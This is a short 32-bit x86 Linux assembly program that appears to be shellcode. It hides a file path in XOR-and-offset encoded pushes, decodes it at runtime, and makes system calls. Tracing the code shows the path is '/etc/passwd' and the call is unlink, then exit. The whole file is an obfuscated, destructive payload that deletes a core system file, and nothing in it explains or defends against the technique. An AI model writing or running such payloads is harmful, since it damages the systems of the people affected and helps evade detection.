BITS 32

section .text
global _start
	_start:
			xor ecx, ecx
			imul ecx
			push 0xe4c9cb
			push 0xc9f9ce8f
			push 0xf1c4cb87
			mov ebx, esp
			mov cl, 0xb
			_flip:
				add al, 0x2
				xor byte [esp], 10101010b
				add [esp], al
				inc esp
				loop _flip
			sub al, 0xc	
			int 0x80
			inc al
			int 0x80
